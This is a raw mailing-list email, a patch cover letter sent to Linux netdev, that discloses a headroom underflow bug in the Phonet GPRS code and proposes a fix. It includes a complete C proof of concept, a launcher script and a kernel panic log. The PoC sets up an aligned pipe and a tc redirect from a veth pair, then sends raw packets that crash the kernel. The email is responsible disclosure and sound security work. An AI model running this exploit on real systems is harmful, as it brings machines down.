Received: from mail-pj1-f43.google.com (mail-pj1-f43.google.com [209.85.216.43])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6DE5B1DF75B
	for <netdev@vger.kernel.org>; Mon, 12 Oct 2026 00:48:59 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.43
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791766141; cv=none; b=Uont+3EDJNM4qnvCFqwa0P9d8O5vWV8TUy7NAoY9OD6t4TiNhATCvNGLLYtwO5n6SCtNQt4gH3btZtVJMS58b+KZGD2ddoxPmwvYrhZ1484TqUDrsc0tGP1fzl5avXhXooLGEBw9ObN+UsJt7QPdXxAHioNS/aSKNHActO/l4ek=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791766141; c=relaxed/simple;
	bh=9bLIC7ECIHZPeTU6CIgEQPcgKjYOwsZVK3Ha55sYdvk=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=iSSl040ktn094fcstmfWhdkQB8e3fGFRUaf2MEOPmOJyCnvPU8sUruQtliaLhhc4B5CN4Tqo4zM27KgOxTEM/IyZ3JXQDdIDkeWe/IGzjtnquo/fhOP/H20JsSy1vg8CjtdkjF+MnF3oVnHQnRP4+oKtEZMFKgYxfursvBbrPv8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=QVsFz79J; arc=none smtp.client-ip=209.85.216.43
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="QVsFz79J"
Received: by mail-pj1-f43.google.com with SMTP id 98e67ed59e1d1-3ab62a8250aso727362a91.1
        for <netdev@vger.kernel.org>; Sun, 11 Oct 2026 17:48:59 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1791766139; x=1792370939; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=DoVfLdmEpbUcAlUQjP8ZtW94Q0XvG4azxoIwZ/Gb0AY=;
        b=QVsFz79J5AxTK4/Mb0xGZPsxNmkp4ynDDd8JAGqtS7oK0DBEK3E5+LNrBLiuvxpdOe
         Q55IhqBMFAyUVtnEQeQPy4EWIzk11AhOtXqFJhwCBqnAgCAYKA6x6cMG/ybVaJ+nyJfk
         TluoGXssSyyu4L00WGKbARKUrgXCKDamigHUnxbLqdicnx/ZccP/3afKuV7M60K7hqAT
         A9ZypvJTfEvsRL6lLsiL+T4fLczb48XxiMIrkSQPZLkQj7Ts+H/HmtswhB51rXA+oy+1
         3bZlm1Qfp9RUNWw0cIEUaFiuacE0A5NJaM9ntB6taLKkbG0TUXtUy2e0uQbPvK/rApPd
         Pavg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1791766139; x=1792370939;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=DoVfLdmEpbUcAlUQjP8ZtW94Q0XvG4azxoIwZ/Gb0AY=;
        b=NjbJ3k8Kzz9DPiJ1X/tolHbU62V5yKST4890OOco7NcBg1m33wfzrHMyS/3l6pxylJ
         cj8yDRWHlIkzt82LtjfGF8vKvh8izwPLdIVgf5+N6ErROVJjQl+DcssXdUAGwcBhAYJC
         vBKAur5PDNayyIQj5TBsSv+E4ugTxGEimsQIsiibTFpITLKHqdgvZUN/Tnnn59CPnmFV
         6F9IeCnZFfC5QldIAXNQEs7P6d2v2GvequsqTv88djO1wukv0659BzWuDGZ0bVjrAYB6
         9hWf0MM1bYyl1Sf4dDY1pFVUcf5N+nU7Yh3fXU4pl/0BKsMjtqFS1LYwuowBcyOAuRH2
         KW/A==
X-Gm-Message-State: AFq9FYIyt2w2slG7PHIIV+93+/mncfHG2LPNGUStj7ggEZQzHQiA+fzd
	n5MzKbY4H5QnXExpzlDlKemKfa1cW83D58ViJlPehBpRIIpDpBWMvvlCSbFWXoglKH8BmGkJgUl
	BGpLXiI5X
X-Gm-Gg: AYBFou3+kZfqOOWgKAFCjwTqQXEXXhkihcZfgY23A1B6ImloKDeKRCgl7vvCuZqeSr4
	wOJsRsqrqyYY3TqY0iJGwZCDHp5I75TvN3VsPgwNcunvYJuEsjSBMQm8eNS4ZZB5xQ1NjxejzQ4
	dhtQZhdnI4sM1KlfWX+mGXfP++W6HTQjWjUBssMcuUQ91BnYl7Z5+Y3JGWEeRWR/vSFHWb+LQTE
	wEszt6l2pMNxD1GlWv1+kzJmfKyZIIWkpdIoNcu9mIv/V/hoy6DkR6ekg7yOtW40Sf0bjJG0JQP
	CggH18TUmfB53l3xse0gmhMWo5p22X5ovhskG2CJfRjTlFezwcB8bZ7txCzAbljOni3SWd5yvjM
	ymz65N+Bu2G8QhlpsKIFsk850ig5SeWItr07DM/3OFt+t2GQ4YgtlCwkUqQ76q1At+plgMRalta
	Ablq8AHN5lf701FZunEpMUcumMs7r7i3bLBB0BAax0RcRb82LbqWy740SYJ0pv11lBZ18b4bcaD
	2gUEr2e
X-Received: by 2002:a17:90b:1a82:b0:39d:f08e:e6e7 with SMTP id 98e67ed59e1d1-3ab3a35a068mr6732054a91.9.1791766138446;
        Sun, 11 Oct 2026 17:48:58 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([191.222.220.30])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ab36f8277bsm13815171a91.11.2026.10.11.17.48.54
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 11 Oct 2026 17:48:57 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: courmisch@gmail.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	remi.denis-courmont@nokia.com,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] net: phonet: ensure headroom for aligned GPRS TX
Date: Mon, 12 Oct 2026 08:48:50 +0800
Message-ID: <cover.1791616268.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

From: Luxiao Xu <rakukuip@gmail.com>=0D

Hi Linux kernel maintainers,=0D
=0D
We found and validated an skb headroom underflow bug in net/phonet/pep.c.=0D
The bug can be triggered when transmitting packets over an aligned=0D
Phonet GPRS pipe, leading to skb_under_panic and a kernel crash.=0D
We have tested the fix, and it does not affect normal functionality.=0D
=0D
This bug is tracked at: https://bugtracker.nebusec.ai/f/1935=0D
=0D
We will provide detailed information about the bug in this email,=0D
along with a PoC to trigger it.=0D
=0D
=3D=3D=3D details below =3D=3D=3D=0D
=0D
Bug details:=0D
=0D
gprs_xmit() forwards the incoming L3 skb directly to pep_write().=0D
When a server-side pipe has negotiated PN_PIPE_SB_ALIGNED_DATA,=0D
pep_write() skips the wrapper skb allocation and calls pipe_skb_send()=0D
on the original skb.=0D
=0D
pipe_skb_send() prepends the pipe header with skb_push(), and pn_send()=0D
prepends the Phonet header with skb_push() as well. However, the GPRS=0D
netdev advertises hard_header_len =3D 0 and does not set needed_headroom.=0D
If an skb with insufficient headroom (such as one redirected from a veth=0D
interface) is transmitted on an aligned GPRS pipe, skb_push() underflows=0D
the skb headroom and triggers a kernel BUG via skb_under_panic().=0D
=0D
Ensure sufficient headroom in pep_write() using skb_cow_head() before=0D
sending the skb on an aligned pipe. If reallocation fails, drop the skb=0D
and return -ENOMEM.=0D
=0D
Reproducer:=0D
=0D
The reproducer sets up an AF_PHONET address, creates a listening PEP=0D
socket, negotiates PN_PIPE_SB_ALIGNED_DATA on the accepted pipe, enables=0D
GPRS encapsulation (creating gprs0), and uses tc mirred redirect on a=0D
veth pair to forward raw packets to gprs0 with minimal headroom.=0D
=0D
We run the PoC in an x86 QEMU environment.=0D
=0D
=3D=3D=3D BEGIN poc.c =3D=3D=3D=0D
    #define _GNU_SOURCE=0D
=0D
    #include <arpa/inet.h>=0D
    #include <errno.h>=0D
    #include <linux/if_ether.h>=0D
    #include <linux/if_packet.h>=0D
    #include <linux/netlink.h>=0D
    #include <linux/phonet.h>=0D
    #include <linux/rtnetlink.h>=0D
    #include <net/if.h>=0D
    #include <stdbool.h>=0D
    #include <stdint.h>=0D
    #include <stdio.h>=0D
    #include <stdlib.h>=0D
    #include <string.h>=0D
    #include <sys/ioctl.h>=0D
    #include <sys/socket.h>=0D
    #include <sys/types.h>=0D
    #include <unistd.h>=0D
=0D
    #ifndef AF_PHONET=0D
    #define AF_PHONET 35=0D
    #endif=0D
=0D
    #define PNS_PIPE_ENABLED_IND 0x64=0D
    #define PNS_PEP_CONNECT_REQ 0x40=0D
    #define PN_PIPE_SB_ALIGNED_DATA 6=0D
    #define PN_PIPE_ENABLE 1=0D
    #define PHONET_ADDR 0x10=0D
    #define PIPE_HANDLE 0x01=0D
=0D
static void die(const char *msg)=0D
{=0D
	perror(msg);=0D
	exit(EXIT_FAILURE);=0D
}=0D
=0D
static void die_errno(const char *msg, int err)=0D
{=0D
	errno =3D -err;=0D
	perror(msg);=0D
	exit(EXIT_FAILURE);=0D
}=0D
=0D
static int run_cmd(const char *cmd)=0D
{=0D
	int ret;=0D
=0D
	fprintf(stderr, "[*] %s\n", cmd);=0D
	ret =3D system(cmd);=0D
	if (ret !=3D 0)=0D
		fprintf(stderr, "[!] command failed: rc=3D%d\n", ret);=0D
	return ret;=0D
}=0D
=0D
static void addattr_l(struct nlmsghdr *nlh, size_t maxlen, int type,=0D
		      const void *data, size_t alen)=0D
{=0D
	size_t len =3D RTA_LENGTH(alen);=0D
	struct rtattr *rta;=0D
=0D
	if (NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len) > maxlen) {=0D
		fprintf(stderr, "netlink attribute overflow\n");=0D
		exit(EXIT_FAILURE);=0D
	}=0D
=0D
	rta =3D (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));=0D
	rta->rta_type =3D type;=0D
	rta->rta_len =3D len;=0D
	if (alen)=0D
		memcpy(RTA_DATA(rta), data, alen);=0D
	nlh->nlmsg_len =3D NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);=0D
}=0D
=0D
static void rtnl_do_phonet_addr(int ifindex, uint8_t addr, bool add)=0D
{=0D
	struct {=0D
		struct nlmsghdr nlh;=0D
		struct ifaddrmsg ifa;=0D
		char attrbuf[64];=0D
	} req;=0D
	char buf[4096];=0D
	struct sockaddr_nl nl =3D {=0D
		.nl_family =3D AF_NETLINK,=0D
	};=0D
	struct iovec iov;=0D
	struct msghdr msg;=0D
	int fd;=0D
	ssize_t n;=0D
	struct nlmsghdr *nh;=0D
=0D
	fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);=0D
	if (fd < 0)=0D
		die("socket(AF_NETLINK)");=0D
=0D
	memset(&req, 0, sizeof(req));=0D
	req.nlh.nlmsg_len =3D NLMSG_LENGTH(sizeof(req.ifa));=0D
	req.nlh.nlmsg_type =3D add ? RTM_NEWADDR : RTM_DELADDR;=0D
	req.nlh.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;=0D
	if (add)=0D
		req.nlh.nlmsg_flags |=3D NLM_F_CREATE | NLM_F_EXCL;=0D
	req.ifa.ifa_family =3D AF_PHONET;=0D
	req.ifa.ifa_prefixlen =3D 0;=0D
	req.ifa.ifa_scope =3D RT_SCOPE_LINK;=0D
	req.ifa.ifa_index =3D ifindex;=0D
	addattr_l(&req.nlh, sizeof(req), IFA_LOCAL, &addr, sizeof(addr));=0D
=0D
	iov.iov_base =3D &req;=0D
	iov.iov_len =3D req.nlh.nlmsg_len;=0D
	memset(&msg, 0, sizeof(msg));=0D
	msg.msg_name =3D &nl;=0D
	msg.msg_namelen =3D sizeof(nl);=0D
	msg.msg_iov =3D &iov;=0D
	msg.msg_iovlen =3D 1;=0D
=0D
	if (sendmsg(fd, &msg, 0) < 0)=0D
		die("sendmsg(RTM_NEWADDR/DELADDR)");=0D
=0D
	n =3D recv(fd, buf, sizeof(buf), 0);=0D
	if (n < 0)=0D
		die("recv(netlink ack)");=0D
=0D
	for (nh =3D (struct nlmsghdr *)buf; NLMSG_OK(nh, (unsigned int)n);=0D
	     nh =3D NLMSG_NEXT(nh, n)) {=0D
		if (nh->nlmsg_type =3D=3D NLMSG_ERROR) {=0D
			struct nlmsgerr *err =3D (struct nlmsgerr *)NLMSG_DATA(nh);=0D
=0D
			if (err->error =3D=3D 0) {=0D
				close(fd);=0D
				return;=0D
			}=0D
			if (add && err->error =3D=3D -EEXIST) {=0D
				close(fd);=0D
				return;=0D
			}=0D
			die_errno("phonet address netlink ack", err->error);=0D
		}=0D
	}=0D
=0D
	fprintf(stderr, "unexpected netlink response\n");=0D
	close(fd);=0D
	exit(EXIT_FAILURE);=0D
}=0D
=0D
static void bind_phonet_addr(struct sockaddr_pn *spn, uint8_t addr)=0D
{=0D
	memset(spn, 0, sizeof(*spn));=0D
	spn->spn_family =3D AF_PHONET;=0D
	pn_sockaddr_set_addr(spn, addr);=0D
}=0D
=0D
static void xbind(int fd, const struct sockaddr_pn *spn)=0D
{=0D
	if (bind(fd, (const struct sockaddr *)spn, sizeof(*spn)) < 0)=0D
		die("bind(AF_PHONET)");=0D
}=0D
=0D
static struct sockaddr_pn xgetsockname_pn(int fd)=0D
{=0D
	struct sockaddr_pn spn;=0D
	socklen_t sl =3D sizeof(spn);=0D
=0D
	memset(&spn, 0, sizeof(spn));=0D
	if (getsockname(fd, (struct sockaddr *)&spn, &sl) < 0)=0D
		die("getsockname(AF_PHONET)");=0D
	return spn;=0D
}=0D
=0D
static int setup_aligned_gprs(char *gprs_ifname)=0D
{=0D
	static const uint8_t connect_req[64] =3D {=0D
		PN_PIPE_SB_ALIGNED_DATA,=0D
		PNS_PEP_CONNECT_REQ,=0D
		PIPE_HANDLE,=0D
		PN_PIPE_ENABLE,=0D
		0x00, 0x00, 0x00, 0x01,=0D
	};=0D
	static const uint8_t enabled_ind[] =3D {=0D
		0x00,=0D
		PNS_PIPE_ENABLED_IND,=0D
		PIPE_HANDLE,=0D
		0x00,=0D
	};=0D
	struct sockaddr_pn bind_addr;=0D
	struct sockaddr_pn listener_addr;=0D
	struct sockaddr_pn peer_addr;=0D
	int listener_fd;=0D
	int peer_fd;=0D
	int conn_fd;=0D
	int encap =3D PNPIPE_ENCAP_IP;=0D
	int ifindex =3D 0;=0D
	socklen_t optlen =3D sizeof(ifindex);=0D
=0D
	rtnl_do_phonet_addr(if_nametoindex("lo"), PHONET_ADDR, true);=0D
=0D
	listener_fd =3D socket(AF_PHONET, SOCK_SEQPACKET, PN_PROTO_PIPE);=0D
	if (listener_fd < 0)=0D
		die("socket(listener)");=0D
=0D
	bind_phonet_addr(&bind_addr, PHONET_ADDR);=0D
	xbind(listener_fd, &bind_addr);=0D
	listener_addr =3D xgetsockname_pn(listener_fd);=0D
	fprintf(stderr, "[*] listener object=3D0x%04x\n",=0D
		pn_sockaddr_get_object(&listener_addr));=0D
=0D
	if (listen(listener_fd, 1) < 0)=0D
		die("listen(AF_PHONET)");=0D
=0D
	peer_fd =3D socket(AF_PHONET, SOCK_DGRAM, PN_PROTO_PHONET);=0D
	if (peer_fd < 0)=0D
		die("socket(peer)");=0D
=0D
	xbind(peer_fd, &bind_addr);=0D
	peer_addr =3D xgetsockname_pn(peer_fd);=0D
	fprintf(stderr, "[*] peer object=3D0x%04x\n",=0D
		pn_sockaddr_get_object(&peer_addr));=0D
=0D
	if (sendto(peer_fd, connect_req, sizeof(connect_req), 0,=0D
		   (struct sockaddr *)&listener_addr, sizeof(listener_addr)) < 0)=0D
		die("sendto(connect_req)");=0D
=0D
	conn_fd =3D accept(listener_fd, NULL, NULL);=0D
	if (conn_fd < 0)=0D
		die("accept()");=0D
	fprintf(stderr, "[*] accepted aligned pipe\n");=0D
=0D
	if (sendto(peer_fd, enabled_ind, sizeof(enabled_ind), 0,=0D
		   (struct sockaddr *)&listener_addr, sizeof(listener_addr)) < 0)=0D
		die("sendto(enabled_ind)");=0D
=0D
	if (setsockopt(conn_fd, SOL_PNPIPE, PNPIPE_ENCAP, &encap,=0D
		       sizeof(encap)) < 0)=0D
		die("setsockopt(PNPIPE_ENCAP)");=0D
=0D
	if (getsockopt(conn_fd, SOL_PNPIPE, PNPIPE_IFINDEX,=0D
		       &ifindex, &optlen) < 0)=0D
		die("getsockopt(PNPIPE_IFINDEX)");=0D
	if (ifindex <=3D 0)=0D
		die("invalid gprs ifindex");=0D
=0D
	if (!if_indextoname(ifindex, gprs_ifname))=0D
		die("if_indextoname(gprs)");=0D
	fprintf(stderr, "[*] gprs ifname=3D%s ifindex=3D%d\n", gprs_ifname, ifinde=
x);=0D
=0D
	close(listener_fd);=0D
	close(peer_fd);=0D
	return conn_fd;=0D
}=0D
=0D
static void set_if_up(const char *ifname)=0D
{=0D
	struct ifreq ifr;=0D
	int fd;=0D
=0D
	fd =3D socket(AF_INET, SOCK_DGRAM, 0);=0D
	if (fd < 0)=0D
		die("socket(AF_INET)");=0D
=0D
	memset(&ifr, 0, sizeof(ifr));=0D
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);=0D
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)=0D
		die("SIOCGIFFLAGS");=0D
	ifr.ifr_flags |=3D IFF_UP;=0D
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)=0D
		die("SIOCSIFFLAGS");=0D
	close(fd);=0D
}=0D
=0D
static void setup_redirect(const char *src_ifname, const char *dst_ifname)=
=0D
{=0D
	char cmd[512];=0D
=0D
	run_cmd("ip link del pocv0 >/dev/null 2>&1 || true");=0D
	snprintf(cmd, sizeof(cmd), "ip link add %s type veth peer name pocv1",=0D
		 src_ifname);=0D
	if (run_cmd(cmd) !=3D 0)=0D
		exit(EXIT_FAILURE);=0D
	snprintf(cmd, sizeof(cmd), "ip link set %s up", src_ifname);=0D
	if (run_cmd(cmd) !=3D 0)=0D
		exit(EXIT_FAILURE);=0D
	if (run_cmd("ip link set pocv1 up") !=3D 0)=0D
		exit(EXIT_FAILURE);=0D
	snprintf(cmd, sizeof(cmd), "tc qdisc add dev %s clsact", src_ifname);=0D
	if (run_cmd(cmd) !=3D 0)=0D
		exit(EXIT_FAILURE);=0D
	snprintf(cmd, sizeof(cmd),=0D
		 "tc filter add dev %s egress pref 1 matchall "=0D
		 "action mirred egress redirect dev %s",=0D
		 src_ifname, dst_ifname);=0D
	if (run_cmd(cmd) !=3D 0)=0D
		exit(EXIT_FAILURE);=0D
}=0D
=0D
static void trigger_redirect_raw(const char *src_ifname)=0D
{=0D
	uint8_t frame[14 + 20 + 4];=0D
	uint8_t *eth =3D frame;=0D
	uint8_t *ip =3D frame + 14;=0D
	struct sockaddr_ll sll;=0D
	int fd;=0D
	int ifindex;=0D
	int i;=0D
=0D
	memset(frame, 0, sizeof(frame));=0D
	memset(eth, 0x41, 6);=0D
	memset(eth + 6, 0x42, 6);=0D
	eth[12] =3D 0x08;=0D
	eth[13] =3D 0x00;=0D
=0D
	ip[0] =3D 0x45;=0D
	ip[1] =3D 0x00;=0D
	ip[2] =3D 0x00;=0D
	ip[3] =3D sizeof(ip);=0D
	ip[4] =3D 0x00;=0D
	ip[5] =3D 0x01;=0D
	ip[6] =3D 0x00;=0D
	ip[7] =3D 0x00;=0D
	ip[8] =3D 64;=0D
	ip[9] =3D 17;=0D
	ip[12] =3D 1;=0D
	ip[13] =3D 1;=0D
	ip[14] =3D 1;=0D
	ip[15] =3D 1;=0D
	ip[16] =3D 2;=0D
	ip[17] =3D 2;=0D
	ip[18] =3D 2;=0D
	ip[19] =3D 2;=0D
=0D
	ifindex =3D if_nametoindex(src_ifname);=0D
	if (ifindex =3D=3D 0)=0D
		die("if_nametoindex(src)");=0D
=0D
	fd =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));=0D
	if (fd < 0)=0D
		die("socket(AF_PACKET)");=0D
=0D
	memset(&sll, 0, sizeof(sll));=0D
	sll.sll_family =3D AF_PACKET;=0D
	sll.sll_protocol =3D htons(ETH_P_IP);=0D
	sll.sll_ifindex =3D ifindex;=0D
	sll.sll_halen =3D ETH_ALEN;=0D
	memset(sll.sll_addr, 0x41, ETH_ALEN);=0D
=0D
	for (i =3D 0; i < 128; i++) {=0D
		ssize_t ret;=0D
=0D
		ret =3D sendto(fd, frame, sizeof(frame), 0,=0D
			     (struct sockaddr *)&sll, sizeof(sll));=0D
		if (ret < 0)=0D
			die("sendto(AF_PACKET)");=0D
		usleep(1000);=0D
	}=0D
=0D
	close(fd);=0D
}=0D
=0D
int main(int argc, char **argv)=0D
{=0D
	const char *src_ifname =3D "pocv0";=0D
	char gprs_ifname[IF_NAMESIZE];=0D
	int conn_fd;=0D
=0D
	fprintf(stderr,=0D
		"[*] setup aligned phonet pipe and gprs encapsulation\n");=0D
	conn_fd =3D setup_aligned_gprs(gprs_ifname);=0D
	set_if_up(gprs_ifname);=0D
	setup_redirect(src_ifname, gprs_ifname);=0D
=0D
	if (argc > 1 && strcmp(argv[1], "--setup-only") =3D=3D 0) {=0D
		fprintf(stderr, "[*] setup complete; not triggering\n");=0D
		pause();=0D
		return 0;=0D
	}=0D
=0D
	fprintf(stderr, "[*] trigger redirected raw packet xmit\n");=0D
	trigger_redirect_raw(src_ifname);=0D
=0D
	close(conn_fd);=0D
	return 0;=0D
}=0D
=3D=3D=3D END poc.c =3D=3D=3D=0D
=0D
=3D=3D=3D BEGIN poc.sh =3D=3D=3D=0D
    #!/bin/sh=0D
set -eu=0D
=0D
DIR=3D$(CDPATH=3D cd -- "$(dirname -- "$0")" && pwd)=0D
=0D
cd "$DIR"=0D
make=0D
exec ./poc=0D
=3D=3D=3D END poc.sh =3D=3D=3D=0D
=0D
=3D=3D=3D BEGIN crash log =3D=3D=3D=0D
[  292.244773][T10222] skbuff: skb_under_panic: text:ffffffff8a581043 len:4=
2 put:4 head:ffff888047ab96c0 data:ffff888047ab96be tail:0x28 end:0x180 dev=
:gprs0=0D
[  292.247407][T10222] kernel BUG at net/core/skbuff.c:209!=0D
[  292.248168][T10222] Oops: invalid opcode: 0000 [#1] PREEMPT SMP KASAN NO=
PTI=0D
[  292.248769][T10222] CPU: 0 UID: 0 PID: 10222 Comm: poc_phonet_gprs Not t=
ainted 6.12.74 #3=0D
[  292.250121][T10222] RIP: 0010:skb_panic+0x15c/0x1d0=0D
[  292.256868][T10222] Call Trace:=0D
[  292.257355][T10222]  <TASK>=0D
[  292.258154][T10222]  skb_push+0xcf/0xf0=0D
[  292.258479][T10222]  pipe_skb_send+0x143/0x4b0=0D
[  292.259258][T10222]  pep_write+0x3f4/0x4f0=0D
[  292.260017][T10222]  gprs_xmit+0x18d/0x520=0D
[  292.260360][T10222]  dev_hard_start_xmit+0x147/0x7a0=0D
[  292.264712][T10222]  __dev_queue_xmit+0x22bc/0x4350=0D
[  292.270216][T10222]  tcf_dev_queue_xmit+0x45/0x60=0D
[  292.270588][T10222]  tcf_mirred_to_dev+0xc87/0xff0=0D
[  292.275389][T10222]  tcf_action_exec+0x1c2/0xa20=0D
[  292.276519][T10222]  tcf_classify+0x7f1/0x1390=0D
[  292.277198][T10222]  tc_run+0x444/0x760=0D
[  292.279634][T10222]  __dev_queue_xmit+0xb30/0x4350=0D
[  292.285208][T10222]  packet_xmit+0x248/0x360=0D
[  292.285560][T10222]  packet_sendmsg+0x2704/0x55c0=0D
[  292.289562][T10222]  __sys_sendto+0x47e/0x4d0=0D
[  292.291111][T10222]  __x64_sys_sendto+0xe5/0x1c0=0D
[  292.292624][T10222]  do_syscall_64+0xc7/0x250=0D
[  292.293394][T10222] RIP: 0033:0x7ffa33779687=0D
[  292.298780][T10222] ---[ end trace 0000000000000000 ]---=0D
[  292.305715][T10222] Kernel panic - not syncing: Fatal exception in inter=
rupt=0D
[  292.306639][T10222] Rebooting in 86400 seconds..=0D
=3D=3D=3D END crash log =3D=3D=3D=0D
=0D
Best regards,=0D
Luxiao Xu=0D
=0D
Luxiao Xu (1):=0D
  net: phonet: ensure headroom for aligned GPRS TX=0D
=0D
 net/phonet/pep.c | 7 ++++++-=0D
 1 file changed, 6 insertions(+), 1 deletion(-)=0D
=0D
-- =0D
2.43.0=0D
=0D
